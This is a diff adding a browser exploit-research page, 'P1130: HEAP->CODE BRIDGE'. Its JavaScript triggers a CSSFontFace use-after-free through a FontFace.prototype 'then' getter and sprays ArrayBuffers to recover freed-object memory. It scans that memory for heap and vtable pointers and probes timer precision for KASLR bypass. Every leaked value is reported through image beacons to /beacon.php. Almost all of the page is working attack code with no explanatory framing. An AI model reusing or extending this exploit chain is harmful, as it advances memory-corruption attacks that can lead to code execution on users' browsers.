@@ -1,0 +1,286 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1130</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return typeof v==='number'?'0x'+v.toString(16):''+v;}
+
+log('phase','=== P1130: HEAP->CODE BRIDGE ===');
+log('info','Strategy: Use CSSFontFace UAF heap ptrs to find objects with vtables/code ptrs');
+B('P1130-START','t='+Date.now());
+
+var R=[];
+function report(n,v){R.push(n+'='+v);log(v.indexOf&&(v.indexOf('VTAB')>=0||v.indexOf('CODE')>=0||v.indexOf('LEAK')>=0)?'win':v.indexOf&&v.indexOf('SAFE')>=0?'ok':'info',n+': '+v);}
+
+// ===== STRATEGY =====
+// CSSFontFace UAF gives heap ptrs at q11 (~0x10008axxxx) and q13 (~0x10007exxxx)
+// We need to find what OBJECTS live near those addresses
+// If we can find an object with a vtable pointer, we get CODE address
+//
+// Approach 1: Create objects whose layout we know, spray near the UAF region,
+//             then scan with BigUint64Array windows
+// Approach 2: Use the UAF to read ADJACENT memory (objects allocated nearby)
+// Approach 3: FontFace.load() promise chain to leak engine internals
+// Approach 4: Error object stack traces to leak code addresses
+
+// ===== TEST A: Error stack trace code address leak =====
+// In some JSC versions, Error.stack contains hexadecimal addresses
+try{
+  function deepFunc1(){
+    function deepFunc2(){
+      function deepFunc3(){
+        throw new Error('stack_probe');
+      }
+      deepFunc3();
+    }
+    deepFunc2();
+  }
+  try{deepFunc1();}catch(e){
+    var stack=e.stack||'';
+    // Look for hex addresses in stack trace
+    var hexMatches=stack.match(/0x[0-9a-fA-F]+/g);
+    var atMatches=stack.match(/@[^\n]+/g);
+    report('ERROR_STACK','hex='+(hexMatches?hexMatches.join(','):'none')+'|lines='+stack.split('\n').length);
+    B('P1130-STACK','raw='+stack.substring(0,400));
+
+    // Also check column numbers (sometimes encode offsets)
+    var colMatches=stack.match(/:(\d+):\d+/g);
+    if(colMatches)report('STACK_COLS','cols='+colMatches.join(','));
+  }
+}catch(e){report('ERROR_STACK','EXCEPT|'+e.message);}
+
+// ===== TEST B: Function.toString() code address inference =====
+// Native function toString() might reveal build-specific strings
+try{
+  var nativeFuncs=[
+    ['Array.prototype.sort',Array.prototype.sort],
+    ['Array.prototype.splice',Array.prototype.splice],
+    ['Object.keys',Object.keys],
+    ['JSON.parse',JSON.parse],
+    ['parseInt',parseInt],
+    ['eval',eval],
+    ['Function',Function],
+    ['RegExp',RegExp],
+    ['Promise',Promise],
+    ['Map',Map],
+    ['Set',Set],
+    ['WeakRef',WeakRef],
+    ['Symbol',Symbol],
+    ['BigInt',BigInt],
+    ['ArrayBuffer',ArrayBuffer],
+    ['DataView',DataView],
+    ['Proxy',Proxy],
+    ['Reflect.apply',Reflect.apply]
+  ];
+  var funcStrings=[];
+  for(var i=0;i<nativeFuncs.length;i++){
+    var str=''+nativeFuncs[i][1];
+    if(str.indexOf('[native code]')<0){
+      funcStrings.push(nativeFuncs[i][0]+'=NONNAT:'+str.substring(0,60));
+    }
+  }
+  report('FUNC_TOSTRING',funcStrings.length>0?'NONNAT='+funcStrings.join(';'):'allnative');
+}catch(e){report('FUNC_TOSTRING','EXCEPT|'+e.message);}
+
+// ===== TEST C: Adjacent memory scan via oversized ArrayBuffer =====
+// The UAF target is 192 bytes. If we allocate a LARGER buffer (4KB+)
+// that happens to encompass the UAF address, we can scan past the object
+try{
+  // Trigger CSSFontFace UAF but with LARGE buffers
+  var SIZES=[4096,8192,16384]; // 4KB, 8KB, 16KB
+  var K=6; // spray count per size
+  var r=Date.now()%10000;
+  var found=false;
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('f'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;
+
+  var map=null;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(found)return undefined;found=true;
+    if(st.parentNode)st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++)map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});
+    }
+    try{document.fonts.check('1em r'+r);}catch(e){}
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em f'+r+', r'+r,'AB').then(function(){},function(){});
+
+  // Scan for CSSFontFace signature: refcount=1, zeroes, heap ptr at offset 88
+  for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
+    if(!map)return;
+    for(var bi=0;bi<map.length;bi++){
+      var b=new BigUint64Array(map[bi].ab);
+      // Search for CSSFontFace pattern anywhere in this buffer
+      for(var q=0;q<b.length-24;q++){
+        if(b[q]===1n){
+          // q0=1 (refcount). Check if q+11 and q+13 look like heap ptrs
+          var q11=b[q+11],q13=b[q+13];
+          if(q11!==0n&&q13!==0n){
+            var h11=Number(q11>>32n),h13=Number(q13>>32n);
+            if(h11>=0x10&&h11<=0xFF&&h13>=0x10&&h13<=0xFF){
+              // All fields between q0 and q11 should be zero
+              var allZero=true;
+              for(var z=1;z<=10;z++)if(b[q+z]!==0n){allZero=false;break;}
+              if(allZero&&b[q+12]===0n){
+                // FOUND CSSFontFace! Now scan PAST it (offset 192+)
+                var pastObj=[];
+                for(var p=24;p<Math.min(48,b.length-q);p++){
+                  if(b[q+p]!==0n){
+                    var hv=Number(b[q+p]>>32n);
+                    var tag=hv>=0x200&&hv<=0x7FFF?'C':hv>=0x10&&hv<=0xFF?'H':hv>=0xFFFF8000?'K':'v';
+                    pastObj.push('+'+(p*8)+':'+hex64(b[q+p])+'('+tag+')');
+                  }
+                }
+                if(pastObj.length>0){
+                  B('P1130-ADJACENT','bi='+bi+'|ms='+ms+'|q='+q+'|'+pastObj.join(','));
+                  report('ADJACENT','bi='+bi+'|past='+pastObj.join(','));
+                }
+
+                // Also scan BEFORE the object
+                var beforeObj=[];
+                for(var p=Math.max(0,q-24);p<q;p++){
+                  if(b[p]!==0n){
+                    var hv=Number(b[p]>>32n);
+                    var tag=hv>=0x200&&hv<=0x7FFF?'C':hv>=0x10&&hv<=0xFF?'H':hv>=0xFFFF8000?'K':'v';
+                    beforeObj.push('-'+((q-p)*8)+':'+hex64(b[p])+'('+tag+')');
+                  }
+                }
+                if(beforeObj.length>0){
+                  B('P1130-BEFORE','bi='+bi+'|ms='+ms+'|'+beforeObj.join(','));
+                  report('BEFORE','bi='+bi+'|before='+beforeObj.join(','));
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  },ms);})(t);}
+
+  setTimeout(function(){delete FontFace.prototype.then;},350);
+}catch(e){report('ADJACENT_SCAN','EXCEPT|'+e.message);}
+
+// ===== TEST D: Performance.now() timing precision =====
+// Check if we have microsecond timing (useful for cache-based KASLR)
+try{
+  var t1=performance.now();
+  var sum=0;for(var i=0;i<10000;i++)sum+=i;
+  var t2=performance.now();
+  var diff=t2-t1;
+
+  // Check resolution
+  var samples=[];
+  for(var i=0;i<50;i++){
+    var a=performance.now();
+    var b=performance.now();
+    if(b>a)samples.push(b-a);
+  }
+  var minRes=Math.min.apply(null,samples);
+  report('PERF_TIMING','min_res='+minRes.toFixed(6)+'ms|compute='+diff.toFixed(6)+'ms');
+  B('P1130-TIMING','res='+minRes+'|compute='+diff);
+}catch(e){report('PERF_TIMING','EXCEPT|'+e.message);}
+
+// ===== TEST E: Constructor prototype chain manipulation =====
+// Check if modifying __proto__ chains can expose internal pointers
+try{
+  var obj={};
+  var ab=new ArrayBuffer(64);
+  var u8=new Uint8Array(ab);
+  var dv=new DataView(ab);
+  var bu=new BigUint64Array(ab);
+
+  // Read ArrayBuffer's internal structure via BigUint64Array
+  // The first 8 bytes might contain a JSCell header with structure ID
+  var headerData=[];
+  for(var i=0;i<8;i++)headerData.push(hex64(bu[i]));
+  report('AB_INTERNALS','q0-7='+headerData.join(','));
+  B('P1130-ABINT',headerData.join(','));
+}catch(e){report('AB_INTERNALS','EXCEPT|'+e.message);}
+
+// ===== TEST F: FinalizationRegistry callback timing =====
+// When an object is GC'd, can we read its backing store in the callback?
+try{
+  if(typeof FinalizationRegistry!=='undefined'){
+    var frAB=new ArrayBuffer(256);
+    var frView=new BigUint64Array(frAB);
+    // Fill with sentinel
+    for(var i=0;i<frView.length;i++)frView[i]=BigInt('0xDEADCAFE'+i.toString(16).padStart(8,'0'));
+
+    var frObj={buf:frAB,view:frView};
+    var frWR=new WeakRef(frObj);
+
+    var frHeldBuf=frAB; // Keep reference to the ArrayBuffer
+    var frHeldView=frView; // Keep reference to view
+
+    var fr=new FinalizationRegistry(function(held){
+      // The wrapper object is GC'd but we still hold the buffer
+      // Check if the buffer contents changed (engine might have reclaimed backing store)
+      var stillSentinel=true;
+      for(var i=0;i<frHeldView.length;i++){
+        if(frHeldView[i]!==BigInt('0xDEADCAFE'+i.toString(16).padStart(8,'0'))){
+          stillSentinel=false;
+          break;
+        }
+      }
+      B('P1130-FR-CB','still_sentinel='+stillSentinel);
+      report('FR_CALLBACK','sentinel_intact='+stillSentinel);
+    });
+    fr.register(frObj,'marker');
+
+    // Clear reference to wrapper object (but keep AB and view)
+    frObj=null;
+
+    // Force GC
+    for(var i=0;i<5000;i++)void new ArrayBuffer(8192);
+
+    setTimeout(function(){
+      var deref=frWR.deref();
+      report('FR_STATUS','alive='+(deref!==undefined)+'|buf_ok='+(frHeldView[0]===BigInt('0xDEADCAFE00000000')));
+    },200);
+  }
+}catch(e){report('FR_TIMING','EXCEPT|'+e.message);}
+
+// ===== TEST G: CSS custom property + getComputedStyle info leak =====
+try{
+  var cpDiv=document.createElement('div');
+  cpDiv.style.setProperty('--test','initial');
+  document.body.appendChild(cpDiv);
+  var cs=getComputedStyle(cpDiv);
+
+  // Check what properties are available
+  var props=[];
+  var pCount=0;
+  for(var key in cs){
+    pCount++;
+    if(pCount>2000)break;
+  }
+  report('COMPUTED_STYLE','props='+pCount);
+  document.body.removeChild(cpDiv);
+}catch(e){report('COMPUTED_STYLE','EXCEPT|'+e.message);}
+
+// ===== FINAL REPORT =====
+setTimeout(function(){
+  B('P1130-DONE',R.join('|'));
+  log('phase','=== '+R.length+' TESTS COMPLETE ===');
+  var chunk='';
+  for(var i=0;i<R.length;i++){
+    chunk+=R[i]+'|';
+    if(chunk.length>800||i===R.length-1){
+      B('P1130-R'+(Math.floor(i/5)),chunk);
+      chunk='';
+    }
+  }
+},1000);
+</script></body></html>
